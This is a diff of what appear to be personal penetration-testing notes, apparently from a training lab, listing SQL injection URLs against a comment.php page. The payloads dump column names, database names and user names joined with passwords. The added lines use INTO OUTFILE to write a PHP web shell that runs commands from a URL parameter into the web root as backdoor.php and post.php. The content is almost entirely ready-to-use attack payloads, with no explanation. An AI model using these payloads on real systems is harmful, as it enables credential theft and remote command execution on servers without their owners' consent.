@@ -24,3 +24,5 @@ http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM
 http://10.11.11.137/comment.php?id=773%20union%20all%20select%201,2,3,4,concat(name,0x3a,password),6%20from%20users
 Databases present in mysql:
 http://10.11.11.137/comment.php?id=773 union all select 1,2,3,4,db,6 from mysql.db
+ union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+ q=f&lang=en' union all select "<?php echo  shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE 'c:/xampp/htdocs/post.php
